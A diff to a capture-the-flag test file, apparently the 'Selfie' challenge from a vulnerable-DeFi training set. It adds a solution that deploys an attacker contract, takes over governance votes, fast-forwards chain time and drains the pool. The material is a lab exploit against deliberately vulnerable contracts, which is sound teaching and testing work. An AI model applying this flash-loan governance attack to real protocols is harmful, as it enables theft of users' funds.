@@ -39,6 +39,35 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await token.snapshot();
+
+        // constructor (address _player, address _pool, address _token, address _governance) {
+        attacker = await (await ethers.getContractFactory('GovernanceAttacker', player)).deploy(
+            player.address,
+            pool.address,
+            token.address,
+            governance.address
+        );
+
+        await attacker.run();
+        console.log("Has access: ", await governance._hasEnoughVotes(attacker.address));
+
+        // queue the exploit
+        await attacker.queueMoney();
+
+        // change the time
+        console.log("Can be executed: ", await governance._canBeExecuted(1));
+        const blockBefore = await ethers.provider.getBlock("latest");
+        console.log("Time Before:", new Date(blockBefore.timestamp * 1000).toUTCString());
+        // Increase time by 2 days in seconds
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
+        await ethers.provider.send("evm_mine"); // Mine a block to make the change take effect
+        const blockAfter = await ethers.provider.getBlock("latest");
+        console.log("Time After:", new Date(blockAfter.timestamp * 1000).toUTCString());
+        console.log("Can be executed: ", await governance._canBeExecuted(1));
+
+        // run the exploit
+        await attacker.giveMoney();
     });
 
     after(async function () {
